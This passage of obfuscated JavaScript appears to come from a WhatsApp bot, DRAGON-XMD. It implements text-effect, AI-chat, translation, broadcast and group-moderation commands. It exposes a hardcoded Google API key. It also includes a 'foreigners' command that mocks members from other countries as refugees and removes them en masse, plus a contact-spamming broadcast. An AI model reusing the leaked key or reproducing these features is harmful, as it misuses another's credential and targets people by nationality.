            var _0x40314a = require('mumaker');
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Light myself");
              return;
            }
            try {
              var _0x43dc86 = await _0x40314a.ephoto("https://en.ephoto360.com/light-text-effect-futuristic-technology-style-648.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x43dc86.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x6c46de) {
              _0x10d7a1.reply("💀💀" + _0x6c46de);
            }
          }
          break;
        case "neon":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Neon Dragon");
              return;
            }
            try {
              var _0x1d8331 = await _0x40314a.ephoto("https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x1d8331.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x26d973) {
              _0x10d7a1.reply(_0x26d973);
            }
          }
          break;
        case 'silver':
        case "silva":
          {
            var _0x40314a = require('mumaker');
            if (!_0xe09539 || _0xe09539 == " ") {
              _0x10d7a1.reply("Example Usage : " + prefix + "Silva Dragon");
              return;
            }
            try {
              var _0x2b825d = await _0x40314a.ephoto("https://en.ephoto360.com/create-glossy-silver-3d-text-effect-online-802.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x2b825d.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x2352c1) {
              _0x10d7a1.reply(_0x2352c1);
            }
          }
          break;
        case "devil":
          {
            var _0x40314a = require('mumaker');
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Devil Dragon");
              return;
            }
            try {
              var _0xc605b8 = await _0x40314a.ephoto('https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html', _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0xc605b8.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x3e174a) {
              _0x10d7a1.reply(_0x3e174a);
            }
          }
          break;
        case 'typography':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Typography Dragon");
              return;
            }
            try {
              var _0x192b23 = await _0x40314a.ephoto("https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x192b23.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x16680e) {
              _0x10d7a1.reply(_0x16680e);
            }
          }
          break;
        case "purple":
          {
            var _0x40314a = require('mumaker');
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "purple Dragon");
              return;
            }
            try {
              var _0x285999 = await _0x40314a.ephoto('https://en.ephoto360.com/purple-text-effect-online-100.html', _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x285999.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x47f75c) {
              _0x10d7a1.reply(_0x47f75c);
            }
          }
          break;
        case 'thunder':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Thunder Dragon");
              return;
            }
            try {
              var _0x455667 = await _0x40314a.ephoto("https://en.ephoto360.com/thunder-text-effect-online-97.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x455667.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              });
            } catch (_0x4260eb) {
              _0x10d7a1.reply(_0x4260eb);
            }
          }
          break;
        case 'leaves':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "Leaves DRAGON-XMD");
              return;
            }
            try {
              var _0x4ca6e6 = await _0x40314a.ephoto("https://en.ephoto360.com/green-brush-text-effect-typography-maker-online-153.html", _0xe09539);
              _0x10d7a1.reply("Wait a moment...");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x4ca6e6.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x3b6680) {
              _0x10d7a1.reply(_0x3b6680);
            }
          }
          break;
        case "1917":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "1917 Dragon");
              return;
            }
            try {
              var _0x4bc2ee = await _0x40314a.ephoto("https://en.ephoto360.com/1917-style-text-effect-523.html", _0xe09539);
              _0x10d7a1.reply("Wait a moment...");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x4bc2ee.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4ca6b1) {
              _0x10d7a1.reply(_0x4ca6b1);
            }
          }
          break;
        case "arena":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "arena DRAGON-XMD");
              return;
            }
            try {
              var _0x5ad780 = await _0x40314a.ephoto('https://en.ephoto360.com/create-cover-arena-of-valor-by-mastering-360.html', _0xe09539);
              _0x10d7a1.reply("Wait a moment...");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x5ad780.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x32cae4) {
              _0x10d7a1.reply(_0x32cae4);
            }
          }
          break;
        case 'hacker':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage :  " + prefix + "hacker Dragon");
              return;
            }
            try {
              let _0x2a77e9 = await _0x40314a.ephoto("https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x2a77e9.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x209279) {
              _0x10d7a1.reply("🥵🥵 " + _0x209279);
            }
          }
          break;
        case "sand":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example Usage : " + prefix + "sand Raven");
              return;
            }
            try {
              let _0x46edf0 = await _0x40314a.ephoto('https://en.ephoto360.com/write-names-and-messages-on-the-sand-online-582.html', _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x46edf0.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x2e352c) {
              _0x10d7a1.reply("🚫🚫 " + _0x2e352c);
            }
          }
          break;
        case "dragonball":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage :  " + prefix + "dragonball Dragon");
              return;
            }
            try {
              const _0x1a1ae3 = await _0x40314a.ephoto("https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x1a1ae3.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x338057) {
              _0x10d7a1.reply("🥵🥵 " + _0x338057);
            }
          }
          break;
        case 'naruto':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage : " + prefix + "naruto Dragon");
              return;
            }
            try {
              var _0x3a0acb = await _0x40314a.ephoto("https://en.ephoto360.com/naruto-shippuden-logo-style-text-effect-online-808.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3a0acb.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0xa1805d) {
              _0x10d7a1.reply("🥵🥵 " + _0xa1805d);
            }
          }
          break;
        case "graffiti":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage : " + prefix + "graffiti Dragon");
              return;
            }
            try {
              let _0xf02a23 = await _0x40314a.ephoto("https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0xf02a23.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x2fc12d) {
              _0x10d7a1.reply("🥵🥵 " + _0x2fc12d);
            }
          }
          break;
        case "cat":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage : * " + prefix + "cat Dragon");
              return;
            }
            try {
              let _0x3efeba = await _0x40314a.ephoto("https://en.ephoto360.com/handwritten-text-on-foggy-glass-online-680.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3efeba.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x106b9e) {
              _0x10d7a1.reply("🥵🥵 " + _0x106b9e);
            }
          }
          break;
        case "gold":
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Gold myself");
              return;
            }
            try {
              var _0x33c99d = await _0x40314a.ephoto("https://en.ephoto360.com/modern-gold-4-213.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x33c99d.image
                },
                'caption': "GENERATED BY DRAGON-XMD"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4e662a) {
              _0x10d7a1.reply("💀💀" + _0x4e662a);
            }
          }
          break;
        case 'child':
          {
            var _0x40314a = require("mumaker");
            if (!_0xe09539 || _0xe09539 == '') {
              _0x10d7a1.reply("Example usage: " + prefix + "Child Dragon");
              return;
            }
            try {
              var _0x3c4c51 = await _0x40314a.ephoto("https://en.ephoto360.com/write-text-on-wet-glass-online-589.html", _0xe09539);
              _0x10d7a1.reply("*Wait a moment...*");
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3c4c51.image
                },
                'caption': "GENERATED BY 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x14dc79) {
              _0x10d7a1.reply("💀💀" + _0x14dc79);
            }
          }
          break;
        case "Dommie":
          {
            if (!_0xe09539) {
              return _0x459d18("Hello I'm 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗔𝗜. How can i help u?");
            }
            let _0xf9d18c = await fetchJson("https://bk9.fun/ai/llama?q=" + _0xe09539);
            if (!_0xf9d18c.BK9) {
              return _0x459d18("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x459d18(_0xf9d18c.BK9);
            }
          }
          break;
        case "gpt2":
          {
            if (!_0xe09539) {
              return _0x459d18("What's your question ?");
            }
            let _0x5dd775 = await fetchJson("https://bk9.fun/ai/jeeves-chat?q=" + _0xe09539);
            if (!_0x5dd775.BK9) {
              return _0x459d18("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x459d18(_0x5dd775.BK9);
            }
          }
          break;
        case "trt":
        case "translate":
          {
            try {
              const _0x443058 = _0xe09539.split(" ");
              if (_0x443058.length < 0x2) {
                return _0x10d7a1.reply(" Please provide a language code and text to translate !");
              }
              const _0x1ad30c = _0x443058[0x0];
              const _0x5ac423 = _0x443058.slice(0x1).join(" ");
              const _0x33281f = await fetch("https://api.mymemory.translated.net/get?q=" + encodeURIComponent(_0x5ac423) + "&langpair=en|" + _0x1ad30c);
              if (!_0x33281f.ok) {
                return _0x10d7a1.reply("Failed to fetch data. Please try again later.");
              }
              const _0x1f19f0 = await _0x33281f.json();
              if (!_0x1f19f0.responseData || !_0x1f19f0.responseData.translatedText) {
                return _0x10d7a1.reply("No translation found for the provided text.");
              }
              const _0x23609f = _0x1f19f0.responseData.translatedText;
              const _0x2e5160 = " " + _0x23609f;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': _0x2e5160
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4e296e) {
              console.error("Error occurred:", _0x4e296e);
              _0x10d7a1.reply("An error occurred while fetching the data. Please try again later.\n" + _0x4e296e);
            }
          }
          break;
        case "antidelete":
          {
            try {
              if (!_0x10d7a1.isGroup) {
                return _0x10d7a1.reply("This feature is only for groups!");
              }
              let _0x2f373b = _0x10d7a1.chat;
              let _0x2e98d7 = global.antiDeleteGroups?.['includes'](_0x2f373b);
              if (_0x16f666[0x0] === 'on') {
                if (_0x2e98d7) {
                  return _0x10d7a1.reply("Anti-Delete is already enabled!");
                }
                global.antiDeleteGroups.push(_0x2f373b);
                _0x10d7a1.reply("✅ Anti-Delete has been enabled!");
              } else {
                if (_0x16f666[0x0] === 'off') {
                  if (!_0x2e98d7) {
                    return _0x10d7a1.reply("Anti-Delete is already disabled!");
                  }
                  global.antiDeleteGroups = global.antiDeleteGroups.filter(_0x73d2c1 => _0x73d2c1 !== _0x2f373b);
                  _0x10d7a1.reply("❌ Anti-Delete has been disabled!");
                } else {
                  _0x10d7a1.reply("Usage: *antidelete on* or *antidelete off*");
                }
              }
            } catch (_0xa19617) {
              console.error("Error in Anti-Delete:", _0xa19617);
              _0x10d7a1.reply("An error occurred while processing your request.");
            }
          }
          break;
        case "cast":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xe09539) {
              return _0x10d7a1.reply("provide a text to cast !");
            }
            let _0x16d603 = await _0x1d7b4.filter(_0x27776a => _0x27776a.id.endsWith(".net")).map(_0x5e4b95 => _0x5e4b95.id);
            _0x10d7a1.reply("Success in casting the message to contacts\n\nDo not always use this Command to avoid WA-bans ! ");
            for (let _0x2878f6 of _0x16d603) {
              _0x34f9ed.sendMessage(_0x2878f6, {
                'text': q
              });
            }
            _0x10d7a1.reply("Casting completed successfully😁");
          }
          break;
        case "img":
        case 'ai-img':
        case "image":
        case "images":
          {
            var _0x344f9a = require("g-i-s");
            if (!_0xe09539) {
              return _0x10d7a1.reply("Provide a text");
            }
            try {
              _0x344f9a(_0xe09539, async (_0x201b31, _0x69d3fa) => {
                if (_0x201b31) {
                  return _0x10d7a1.reply("An error occurred while searching for images.\n" + _0x201b31);
                }
                if (_0x69d3fa.length === 0x0) {
                  return _0x10d7a1.reply("No images found.");
                }
                const _0x49e852 = Math.min(_0x69d3fa.length, 0x5);
                const _0x2007ab = _0x69d3fa.slice(0x0, _0x49e852).map(_0x1380cd => _0x1380cd.url);
                const _0x284ead = _0x2007ab.map(_0x22b09f => ({
                  'image': {
                    'url': _0x22b09f
                  },
                  'caption': "Downloaded by " + botname
                }));
                for (const _0x1721a2 of _0x284ead) {
                  await _0x34f9ed.sendMessage(_0x10d7a1.chat, _0x1721a2, {
                    'quoted': _0x10d7a1
                  });
                }
              });
            } catch (_0x4b2580) {
              _0x10d7a1.reply("An error occurred.\n" + _0x4b2580);
            }
          }
          break;
        case "foreigners":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            let _0x2c00df = _0x1d7b4.filter(_0x1843f9 => !_0x1843f9.admin).map(_0x430d5f => _0x430d5f.id).filter(_0x15ee82 => !_0x15ee82.startsWith(mycode) && _0x15ee82 != _0x34f9ed.decodeJid(_0x34f9ed.user.id));
            if (!_0x16f666 || !_0x16f666[0x0]) {
              if (_0x2c00df.length == 0x0) {
                return _0x10d7a1.reply("No foreigners detected.");
              }
              let _0x4c05d6 = "𝑭𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒂𝒓𝒆 𝒕𝒉𝒐𝒔𝒆 𝒈𝒖𝒚𝒔 𝒘𝒉𝒐𝒔𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝒄𝒐𝒅𝒆 𝒊𝒔 𝒏𝒐𝒕 " + mycode + ". 𝑻𝒉𝒆 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔  " + _0x2c00df.length + " 𝒐𝒓 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔 𝒘𝒆𝒓𝒆 𝒅𝒆𝒕𝒆𝒄𝒕𝒆𝒅:- \n";
              for (let _0x4093e5 of _0x2c00df) {
                _0x4c05d6 += "𓅂 @" + _0x4093e5.split('@')[0x0] + "\n";
              }
              _0x4c05d6 += "\n𝑻𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒕𝒉𝒆𝒎 𝒔𝒆𝒏𝒅 foreigners -x";
              _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': _0x4c05d6,
                'mentions': _0x2c00df
              }, {
                'quoted': _0x10d7a1
              });
            } else if (_0x16f666[0x0] == '-x') {
              setTimeout(() => {
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'text': "𝐃𝐫𝐚𝐠𝐨𝐧 𝒘𝒊𝒍𝒍 𝒏𝒐𝒘 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 " + _0x2c00df.length + " 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓𝒔/𝒓𝒆𝒇𝒖𝒈𝒆𝒆𝒔 𝒇𝒓𝒐𝒎 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒄𝒉𝒂𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝒈𝒐𝒐𝒅𝒃𝒚𝒆. 𝑻𝒉𝒊𝒔 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒄𝒂𝒏 𝒏𝒐𝒕 𝒃𝒆 𝒕𝒆𝒓𝒎𝒊𝒏𝒂𝒕𝒆𝒅😂⚠️\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
                }, {
                  'quoted': _0x10d7a1
                });
                setTimeout(() => {
                  _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, _0x2c00df, 'remove');
                  setTimeout(() => {
                    _0x10d7a1.reply("𝑨𝒏𝒚 𝒓𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈 𝒇𝒐𝒓𝒆𝒊𝒈𝒏𝒆𝒓, 𝒓𝒂𝒊𝒔𝒆 𝒚𝒐𝒖𝒓 𝒉𝒂𝒏𝒅𝒔?🌚😂.");
                  }, 0x3e8);
                }, 0x3e8);
              }, 0x3e8);
            }
          }
          break;
        case "dalle":
        case 'createimage':
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("*𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒊𝒎𝒂𝒈𝒆𝒔 𝒇𝒓𝒐𝒎 𝒕𝒆𝒙𝒕 𝒑𝒓𝒐𝒎𝒑𝒕𝒔*\n\n*𝑬𝒙𝒂𝒎𝒑𝒍𝒆 𝒖𝒔𝒂𝒈𝒆*\n*" + (prefix + _0x502a51) + " 𝑩𝒆𝒂𝒖𝒕𝒊𝒇𝒖𝒍 𝒂𝒏𝒊𝒎𝒆 𝒈𝒊𝒓𝒍*\n*" + (prefix + _0x502a51) + " 𝒈𝒊𝒓𝒍 𝒊𝒏 𝒑𝒊𝒏𝒌 𝒅𝒓𝒆𝒔𝒔*");
            }
            try {
              _0x10d7a1.reply("𝒑𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒂𝒎 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒊𝒎𝒂𝒈𝒆...");
              const _0x54dc1b = "https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=" + encodeURIComponent(_0xe09539);
              const _0x498578 = await fetch(_0x54dc1b);
              if (_0x498578.ok) {
                const _0x127de3 = await _0x498578.buffer();
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'image': _0x127de3
                }, {
                  'quoted': _0x10d7a1
                });
              } else {
                throw "*𝒂𝒂𝒉𝒉𝒉𝒓𝒈 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒇𝒂𝒊𝒍𝒆𝒅*\n\n© >𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗";
              }
            } catch {
              _0x10d7a1.reply("𝑶𝒐𝒑𝒔! 𝒔𝒐𝒎𝒆𝒕𝒉𝒊𝒏𝒈 𝒘𝒆𝒏𝒕 𝒘𝒓𝒐𝒏𝒈 𝒘𝒉𝒊𝒍𝒆 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒊𝒎𝒂𝒈𝒆. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓, 𝑫𝑹𝑨𝑮𝑶𝑵 𝐭𝐡𝐞 𝐛𝐞𝐭𝐭𝐞𝐫 𝐨𝐩𝐭𝐢𝐨𝐧😂.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
            }
          }
          break;
        case 'ai':
          {
            const {
              GoogleGenerativeAI: _0x1e2d2d
            } = require("@google/generative-ai");
            const _0x57517e = require("axios");
            try {
              if (!_0x10d7a1.quoted) {
                return _0x10d7a1.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵!");
              }
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗔𝗶, 𝘂𝘀𝗶𝗻𝗴 𝗴𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              }
              if (!/image/.test(_0x1dbbb8)) {
                return _0x10d7a1.reply("𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗮𝗴 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵 !");
              }
              let _0x23beb6 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x10d7a1.quoted);
              let _0x3f54b9 = await uploadtoimgur(_0x23beb6);
              _0x10d7a1.reply("𝗔 𝗺𝗼𝗺𝗲𝘁, 𝗹𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗜𝗺𝗮𝗴𝗲...");
              const _0x559aed = new _0x1e2d2d("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
              async function _0x243863(_0x327828, _0x4ec8be) {
                const _0x39163e = {
                  'responseType': 'arraybuffer'
                };
                const _0x2b3de1 = await _0x57517e.get(_0x327828, _0x39163e);
                const _0x402d99 = Buffer.from(_0x2b3de1.data).toString("base64");
                const _0x463ff1 = {
                  'data': _0x402d99,
                  'mimeType': _0x4ec8be
                };
                const _0x2bd4eb = {
                  'inlineData': _0x463ff1
                };
                return _0x2bd4eb;
              }
              const _0x53b8fe = {
                'model': "gemini-1.5-flash"
              };
              const _0x536f08 = _0x559aed.getGenerativeModel(_0x53b8fe);
              const _0x24d736 = [await _0x243863(_0x3f54b9, "image/jpeg")];
              const _0x1d7c2d = await _0x536f08.generateContent([_0xe09539, ..._0x24d736]);
              const _0x3a1c9c = await _0x1d7c2d.response;
              const _0x44550f = _0x3a1c9c.text();
              await _0x10d7a1.reply(_0x44550f);
            } catch (_0x2bebb3) {
              _0x10d7a1.reply("I am unable to analyze images at the moment\n" + _0x2bebb3);
            }
          }
          break;
        case "ai2":
          {
            try {
              if (!_0x10d7a1.quoted) {
                return _0x10d7a1.reply("Send the image then tag it with the instruction.");
              }
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵! 𝗧𝗵𝗶𝘀 Dragon AI 𝗨𝘀𝗲 𝗚𝗲𝗺𝗶𝗻𝗶-𝗽𝗿𝗼-𝘃𝗶𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘀𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              }
              if (!/image/.test(_0x1dbbb8)) {
                return _0x10d7a1.reply("That is not an image, try again while quoting an actual image.");
              }
              let _0x432ab7 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x10d7a1.quoted);
              let _0x359deb = await uploadtoimgur(_0x432ab7);
              _0x10d7a1.reply("𝗔 𝗠𝗼𝗺𝗲𝗻𝘁, 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗[𝗗𝗥𝗔𝗚𝗢𝗡-𝗔𝗜] 𝗶𝘀 𝗮𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");
              const _0x233a41 = await fetchJson("https://api.dreaded.site/api/gemini-vision?url=" + _0x359deb + "&instruction=" + _0xe09539);
              let _0x4554b1 = _0x233a41.result;
              await _0x10d7a1.reply(_0x4554b1);
            } catch (_0xcc0a48) {
              _0x10d7a1.reply("I am unable to analyze images at the moment\n" + _0xcc0a48);
            }
          }
          break;
        case "vision":
          {
            if (!_0x37f12c || !_0xe09539) {
